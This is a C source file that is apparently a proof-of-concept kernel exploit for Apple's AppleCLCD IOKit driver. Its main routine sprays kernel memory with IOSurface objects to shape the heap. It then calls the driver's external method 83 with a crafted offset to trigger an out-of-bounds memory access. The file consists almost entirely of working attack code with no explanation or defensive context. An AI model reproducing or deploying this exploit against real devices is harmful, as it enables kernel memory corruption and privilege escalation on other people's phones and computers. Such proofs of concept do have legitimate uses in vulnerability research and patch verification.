#include "exploit.h"

io_connect_t get_appleclcd_uc(void) {
    kern_return_t ret;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    int type = 2;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AppleCLCD"));
    
    if(service == MACH_PORT_NULL) {
        printf("[-] failed to open service\n");
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD service: 0x%x\n", service);

    ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
    if(ret != KERN_SUCCESS) {
        printf("[-] failed to open userclient: %s\n", mach_error_string(ret));
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD userclient: 0x%x\n", shared_user_client_conn);
    
    return shared_user_client_conn;
}

uint64_t trigger_oob(uint64_t offset) {
    kern_return_t ret;
    
    uint64_t scalars[1] = { 0x0 };
    scalars[0] = offset / 8;

    uint64_t output_scalars[1] = { 0 };
    uint32_t output_scalars_size = 1;

    io_connect_t appleclcd_uc = get_appleclcd_uc();
    if (appleclcd_uc == MACH_PORT_NULL) {
        return 0;
    }

    ret = IOConnectCallMethod(appleclcd_uc, 83,
                                    scalars, 1,
                                    NULL, 0,
                                    output_scalars, &output_scalars_size,
                                    NULL, NULL);
    
    if (ret != KERN_SUCCESS) {
        printf("[-] external method 83 failed: %s\n",  mach_error_string(ret));
        return 0;
    }
    
    printf("[*] external method 83 returned: 0x%llx\n", output_scalars[0]);
    return output_scalars[0];
}

bool do_spray(void) {
    char data[0x10];
    memset(data, 0x41, sizeof(data));
    
    io_connect_t iosurface_uc = get_iosurface_root_uc();
    if (iosurface_uc == MACH_PORT_NULL) {
        printf("[-] do_spray: failed to allocate bew iosurface_uc\n");
        return false;
    }
    
    int *surface_ids = (int*)malloc(SURFACES_COUNT * sizeof(int));
    for (size_t i = 0; i < SURFACES_COUNT; ++i) {
        surface_ids[i] = create_surface(iosurface_uc);
        if (surface_ids[i] <= 0) {
            return false;
        }
        
        if (IOSurface_spray_with_gc(iosurface_uc, surface_ids[i], 20, 200, data, sizeof(data), NULL) == false) {
            printf("iosurface spray failed\n");
            return false;
        }
    }
    
    return true;
}

int main(void) {
    io_connect_t iosurface_uc = get_iosurface_root_uc();
    if (iosurface_uc == MACH_PORT_NULL) {
	return 0;
    } 
   
    printf("[*] do spray\n"); 
    if (do_spray() == false) {
        printf("[-] shape failed, abort\n");
        return 1;
    }
    printf("[*] spray success\n");

    printf("[*] trigger\n");
    trigger_oob(0x1200000+0x1048);
    return 0;
}
